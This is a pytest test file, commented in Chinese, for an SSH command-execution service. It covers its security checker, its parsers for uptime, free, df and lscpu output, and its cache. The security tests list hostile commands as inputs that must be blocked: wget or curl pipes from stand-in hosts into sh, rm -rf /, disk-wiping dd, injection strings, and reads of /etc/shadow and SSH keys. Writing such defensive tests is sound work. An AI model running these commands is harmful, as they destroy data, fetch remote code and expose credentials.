"""
測試指令執行引擎模組

測試指令執行、結果解析、安全檢查和快取功能
"""

import pytest
import asyncio
import time
from unittest.mock import Mock, patch, AsyncMock
from datetime import datetime

from services.command_executor import (
    CommandExecutor, CommandSecurityChecker, CommandParser, CommandCache,
    CommandType, ExecutionStatus, CommandResult, CommandDefinition
)
from services.ssh_manager import SSHConnectionConfig, SSHManager
from utils.exceptions import SecurityError, CommandExecutionError


class TestCommandSecurityChecker:
    """測試指令安全檢查器"""
    
    def setup_method(self):
        """設置測試環境"""
        self.checker = CommandSecurityChecker()
    
    def test_safe_commands(self):
        """測試安全指令"""
        safe_commands = [
            "uptime",
            "hostname",
            "cat /proc/cpuinfo",
            "free -m",
            "df -h",
            "ps aux",
            "netstat -tuln",
            "lscpu",
            "uname -a"
        ]
        
        for command in safe_commands:
            is_safe, reason = self.checker.is_command_safe(command)
            assert is_safe, f"指令 '{command}' 應該是安全的，但被拒絕: {reason}"
    
    def test_dangerous_commands(self):
        """測試危險指令"""
        dangerous_commands = [
            "rm -rf /",
            "mkfs.ext4 /dev/sda1",
            "dd if=/dev/zero of=/dev/sda",
            "shutdown -h now",
            "reboot",
            "killall -9 ssh",
            "iptables -F",
            "chmod 777 /etc/passwd"
        ]
        
        for command in dangerous_commands:
            is_safe, reason = self.checker.is_command_safe(command)
            assert not is_safe, f"指令 '{command}' 應該被阻止，但被允許"
    
    def test_suspicious_commands(self):
        """測試可疑指令"""
        suspicious_commands = [
            "wget http://evil.com/script.sh | sh",
            "curl -s http://malware.com | bash",
            "echo 'evil' > /etc/passwd",
            "cp malware /etc/init.d/",
            "crontab -r"
        ]
        
        for command in suspicious_commands:
            is_safe, reason = self.checker.is_command_safe(command)
            assert not is_safe, f"指令 '{command}' 應該被阻止，但被允許"
    
    def test_command_syntax_validation(self):
        """測試指令語法驗證"""
        # 有效語法
        valid_commands = [
            "ls -la",
            "ps aux | grep ssh",
            "df -h > /tmp/disk.txt"
        ]
        
        for command in valid_commands:
            is_valid, reason = self.checker.validate_command_syntax(command)
            # 注意：由於我們的安全檢查器會阻止管道和重定向，這裡只測試基本指令
            if '|' not in command and '>' not in command:
                assert is_valid, f"指令語法 '{command}' 應該有效，但被拒絕: {reason}"
        
        # 無效語法
        invalid_commands = [
            "ls; rm -rf /",
            "ls && malicious_command",
            "ls || dangerous_fallback",
            "echo `whoami`",
            "echo $(rm -rf /)"
        ]
        
        for command in invalid_commands:
            is_valid, reason = self.checker.validate_command_syntax(command)
            assert not is_valid, f"指令語法 '{command}' 應該無效，但被接受"
    
    def test_cat_file_restrictions(self):
        """測試 cat 指令的檔案限制"""
        # 允許的檔案
        allowed_files = [
            "cat /proc/cpuinfo",
            "cat /proc/meminfo",
            "cat /sys/class/net/eth0/statistics/rx_bytes"
        ]
        
        for command in allowed_files:
            is_safe, reason = self.checker.is_command_safe(command)
            assert is_safe, f"指令 '{command}' 應該被允許，但被拒絕: {reason}"
        
        # 不允許的檔案
        forbidden_files = [
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/user/.ssh/id_rsa"
        ]
        
        for command in forbidden_files:
            is_safe, reason = self.checker.is_command_safe(command)
            assert not is_safe, f"指令 '{command}' 應該被拒絕，但被允許"


class TestCommandParser:
    """測試指令結果解析器"""
    
    def setup_method(self):
        """設置測試環境"""
        self.parser = CommandParser()
    
    def test_parse_uptime(self):
        """測試解析 uptime 輸出"""
        uptime_output = " 16:30:01 up 10 days,  1:23,  2 users,  load average: 0.15, 0.10, 0.05"
        result = self.parser.parse_uptime(uptime_output)
        
        assert "uptime_string" in result
        assert "load_average" in result
        assert result["load_average"]["1min"] == 0.15
        assert result["load_average"]["5min"] == 0.10
        assert result["load_average"]["15min"] == 0.05
    
    def test_parse_free_memory(self):
        """測試解析 free -m 輸出"""
        free_output = """              total        used        free      shared  buff/cache   available
Mem:           7976        2567        1234         123        4175        4987
Swap:          2047           0        2047"""
        
        result = self.parser.parse_free_memory(free_output)
        
        assert "total" in result
        assert "used" in result
        assert "free" in result
        assert "available" in result
        assert result["unit"] == "MB"
        assert result["total"] == 7976
        assert result["used"] == 2567
        assert result["available"] == 4987
    
    def test_parse_df_disk(self):
        """測試解析 df -h 輸出"""
        df_output = """Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1        50G   20G   28G  42% /
/dev/sda2       100G   50G   46G  53% /home
tmpfs           4.0G     0  4.0G   0% /dev/shm"""
        
        result = self.parser.parse_df_disk(df_output)
        
        assert "filesystems" in result
        filesystems = result["filesystems"]
        assert len(filesystems) == 3
        
        root_fs = filesystems[0]
        assert root_fs["filesystem"] == "/dev/sda1"
        assert root_fs["size"] == "50G"
        assert root_fs["used"] == "20G"
        assert root_fs["use_percent"] == "42%"
        assert root_fs["mounted_on"] == "/"
    
    def test_parse_lscpu(self):
        """測試解析 lscpu 輸出"""
        lscpu_output = """Architecture:        x86_64
CPU op-mode(s):      32-bit, 64-bit
Byte Order:          Little Endian
CPU(s):              4
Vendor ID:           GenuineIntel
Model name:          Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz"""
        
        result = self.parser.parse_lscpu(lscpu_output)
        
        assert "architecture" in result
        assert "cpu_op-mode(s)" in result
        assert "cpu(s)" in result
        assert "vendor_id" in result
        assert "model_name" in result
        assert result["architecture"] == "x86_64"
        assert result["vendor_id"] == "GenuineIntel"
    
    def test_parse_uname(self):
        """測試解析 uname -a 輸出"""
        uname_output = "Linux web-server 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux"
        result = self.parser.parse_uname(uname_output)
        
        assert "kernel_name" in result
        assert "hostname" in result
        assert "kernel_release" in result
        assert "machine" in result
        assert result["kernel_name"] == "Linux"
        assert result["hostname"] == "web-server"
        assert result["kernel_release"] == "5.4.0-42-generic"
        assert result["machine"] == "x86_64"


class TestCommandCache:
    """測試指令快取"""
    
    def setup_method(self):
        """設置測試環境"""
        self.cache = CommandCache()
    
    def test_cache_operations(self):
        """測試快取基本操作"""
        server_key = "test@localhost:22"
        command = "uptime"
        
        # 建立測試結果
        result = CommandResult(
            command=command,
            command_type=CommandType.SYSTEM_INFO,
            status=ExecutionStatus.SUCCESS,
            stdout="test output",
            timestamp=datetime.now()
        )
        
        # 測試設定快取
        self.cache.set(server_key, command, result)
        
        # 測試獲取快取
        cached_result = self.cache.get(server_key, command, ttl=60)
        assert cached_result is not None
        assert cached_result.command == command
        assert cached_result.stdout == "test output"
    
    def test_cache_expiry(self):
        """測試快取過期"""
        server_key = "test@localhost:22"
        command = "uptime"
        
        result = CommandResult(
            command=command,
            command_type=CommandType.SYSTEM_INFO,
            status=ExecutionStatus.SUCCESS,
            stdout="test output",
            timestamp=datetime.now()
        )
        
        # 設定快取
        self.cache.set(server_key, command, result)
        
        # TTL=0 應該返回 None
        cached_result = self.cache.get(server_key, command, ttl=0)
        assert cached_result is None
        
        # 有效 TTL 應該返回結果
        cached_result = self.cache.get(server_key, command, ttl=60)
        assert cached_result is not None
    
    def test_cache_key_generation(self):
        """測試快取鍵生成"""
        server_key1 = "user1@host1:22"
        server_key2 = "user2@host2:22"
        command = "uptime"
        
        key1 = self.cache._get_cache_key(server_key1, command)
        key2 = self.cache._get_cache_key(server_key2, command)
        
        # 不同的伺服器應該產生不同的快取鍵
        assert key1 != key2
        
        # 相同的伺服器和指令應該產生相同的快取鍵
        key1_again = self.cache._get_cache_key(server_key1, command)
        assert key1 == key1_again


class TestCommandExecutor:
    """測試指令執行器"""
    
    def setup_method(self):
        """設置測試環境"""
        self.mock_ssh_manager = Mock(spec=SSHManager)
        self.executor = CommandExecutor(self.mock_ssh_manager)
    
    @patch('app.services.command_executor.logger')
    async def test_execute_command_success(self, mock_logger):
        """測試成功執行指令"""
        # 模擬 SSH 管理器回應
        self.mock_ssh_manager.execute_command = AsyncMock(
            return_value=("test output", "", 0)
        )
        
        config = SSHConnectionConfig(
            host="localhost",
            username="test",
            password="test123"
        )
        
        result = await self.executor.execute_command(
            config=config,
            command="uptime",
            command_type=CommandType.SYSTEM_INFO
        )
        
        assert result.status == ExecutionStatus.SUCCESS
        assert result.command == "uptime"
        assert result.stdout == "test output"
        assert result.exit_code == 0
        assert result.execution_time > 0
    
    async def test_execute_command_security_blocked(self):
        """測試安全檢查阻止危險指令"""
        config = SSHConnectionConfig(
            host="localhost",
            username="test",
            password="test123"
        )
        
        result = await self.executor.execute_command(
            config=config,
            command="rm -rf /",
            command_type=CommandType.CUSTOM
        )
        
        assert result.status == ExecutionStatus.SECURITY_BLOCKED
        assert "安全檢查失敗" in result.error_message
    
    async def test_execute_command_failed(self):
        """測試指令執行失敗"""
        # 模擬指令執行失敗
        self.mock_ssh_manager.execute_command = AsyncMock(
            return_value=("", "command not found", 127)
        )
        
        config = SSHConnectionConfig(
            host="localhost",
            username="test",
            password="test123"
        )
        
        result = await self.executor.execute_command(
            config=config,
            command="nonexistent_command",
            command_type=CommandType.CUSTOM
        )
        
        assert result.status == ExecutionStatus.FAILED
        assert result.exit_code == 127
        assert result.stderr == "command not found"
    
    async def test_execute_command_timeout(self):
        """測試指令執行超時"""
        # 模擬超時異常
        self.mock_ssh_manager.execute_command = AsyncMock(
            side_effect=asyncio.TimeoutError()
        )
        
        config = SSHConnectionConfig(
            host="localhost",
            username="test",
            password="test123"
        )
        
        result = await self.executor.execute_command(
            config=config,
            command="sleep 100",
            timeout=1
        )
        
        assert result.status == ExecutionStatus.TIMEOUT
        assert "超時" in result.error_message
    
    async def test_execute_predefined_command(self):
        """測試執行預定義指令"""
        # 模擬成功執行
        self.mock_ssh_manager.execute_command = AsyncMock(
            return_value=(" 16:30:01 up 10 days,  1:23,  2 users,  load average: 0.15, 0.10, 0.05", "", 0)
        )
        
        config = SSHConnectionConfig(
            host="localhost",
            username="test",
            password="test123"
        )
        
        result = await self.executor.execute_predefined_command(
            config=config,
            command_name="uptime"
        )
        
        assert result.status == ExecutionStatus.SUCCESS
        assert result.parsed_data is not None
        assert "load_average" in result.parsed_data
    
    async def test_execute_nonexistent_predefined_command(self):
        """測試執行不存在的預定義指令"""
        config = SSHConnectionConfig(
            host="localhost",
            username="test",
            password="test123"
        )
        
        result = await self.executor.execute_predefined_command(
            config=config,
            command_name="nonexistent_command"
        )
        
        assert result.status == ExecutionStatus.FAILED
        assert "未找到預定義指令" in result.error_message
    
    def test_get_predefined_commands(self):
        """測試獲取預定義指令列表"""
        commands = self.executor.get_predefined_commands()
        
        assert isinstance(commands, dict)
        assert len(commands) > 0
        
        # 檢查是否包含基本的預定義指令
        assert "uptime" in commands
        assert "hostname" in commands
        assert "memory_info" in commands
        
        # 檢查指令結構
        uptime_cmd = commands["uptime"]
        assert "name" in uptime_cmd
        assert "command" in uptime_cmd
        assert "description" in uptime_cmd
        assert "timeout" in uptime_cmd
    
    def test_cache_functionality(self):
        """測試快取功能"""
        # 測試快取清理
        self.executor.clear_cache()
        stats = self.executor.get_statistics()
        assert stats["cache_size"] == 0
    
    def test_statistics(self):
        """測試統計功能"""
        stats = self.executor.get_statistics()
        
        assert "total_executions" in stats
        assert "success_rate" in stats
        assert "cache_hit_rate" in stats
        assert "statistics" in stats
        assert "cache_size" in stats
        assert "predefined_commands" in stats
        
        assert isinstance(stats["total_executions"], int)
        assert isinstance(stats["success_rate"], (int, float))
        assert isinstance(stats["cache_hit_rate"], (int, float))


class TestCommandDefinition:
    """測試指令定義"""
    
    def test_command_definition_creation(self):
        """測試建立指令定義"""
        def dummy_parser(output):
            return {"parsed": True}
        
        cmd_def = CommandDefinition(
            name="test_command",
            command="echo test",
            command_type=CommandType.CUSTOM,
            description="測試指令",
            parser=dummy_parser,
            timeout=30,
            security_level="safe"
        )
        
        assert cmd_def.name == "test_command"
        assert cmd_def.command == "echo test"
        assert cmd_def.command_type == CommandType.CUSTOM
        assert cmd_def.description == "測試指令"
        assert cmd_def.parser == dummy_parser
        assert cmd_def.timeout == 30
        assert cmd_def.security_level == "safe"


class TestCommandResult:
    """測試指令結果"""
    
    def test_command_result_creation(self):
        """測試建立指令結果"""
        timestamp = datetime.now()
        
        result = CommandResult(
            command="uptime",
            command_type=CommandType.SYSTEM_INFO,
            status=ExecutionStatus.SUCCESS,
            stdout="test output",
            stderr="",
            exit_code=0,
            execution_time=1.5,
            timestamp=timestamp,
            parsed_data={"key": "value"},
            server_info={"host": "localhost"}
        )
        
        assert result.command == "uptime"
        assert result.command_type == CommandType.SYSTEM_INFO
        assert result.status == ExecutionStatus.SUCCESS
        assert result.stdout == "test output"
        assert result.exit_code == 0
        assert result.execution_time == 1.5
        assert result.timestamp == timestamp
        assert result.parsed_data == {"key": "value"}
        assert result.server_info == {"host": "localhost"}


# 整合測試
class TestCommandExecutorIntegration:
    """指令執行器整合測試"""
    
    @pytest.mark.asyncio
    async def test_full_command_execution_flow(self):
        """測試完整的指令執行流程"""
        # 這個測試需要實際的 SSH 連接，通常在整合測試中運行
        # 這裡只是展示測試結構
        pass
    
    @pytest.mark.asyncio
    async def test_concurrent_command_execution(self):
        """測試並發指令執行"""
        # 測試多個指令同時執行的情況
        pass
    
    @pytest.mark.asyncio  
    async def test_cache_consistency(self):
        """測試快取一致性"""
        # 測試快取在並發環境下的一致性
        pass


if __name__ == "__main__":
    # 執行測試
    pytest.main([__file__, "-v"])